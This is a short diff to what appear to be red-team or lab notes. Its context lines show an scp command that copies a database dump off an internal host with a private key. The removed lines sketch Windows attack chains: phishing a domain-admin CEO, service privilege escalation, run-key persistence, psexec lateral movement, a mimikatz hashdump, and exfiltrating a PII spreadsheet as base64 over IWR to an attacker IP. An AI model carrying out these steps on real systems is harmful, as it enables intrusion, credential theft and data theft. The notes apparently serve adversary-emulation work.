@@ -170,15 +170,3 @@ ssh -i /home/kali/.ssh/majestic admin@10.5.20.12
 # 3. Exfiltrate data using scp with a provided private key 
 scp -i /home/kali/.ssh/majestic admin@10.5.20.12:/opt/database.sql.gz database.sql.gz
 ```
-
-### WINDOWS
-
-WKSTN -> DC
-———————-
-Phish CEO (domain admin) -> weak svc privesc -> run keys persistence -> psexec lateral movement DC (uz si admin na DC) -> mimikatz hashdump
-Phish CEO (domain admin) -> psexec lateral movement DC (uz si admin na DC) -> mimikatz hashdump
-Phish CEO (domain admin) -> psexec lateral movement DC (uz si admin na DC) -> run keys persistence -> mimikatz hashdump
-
---> https://github.com/peass-ng/PEASS-ng, https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/ (fileless), process injection, file exfiltration (pii_udaje.xlsx > Compress-Archive > base64 > IWR > randomip/exfil?data=<base64>) 
-
-randomip = digital ocean / apt group ip
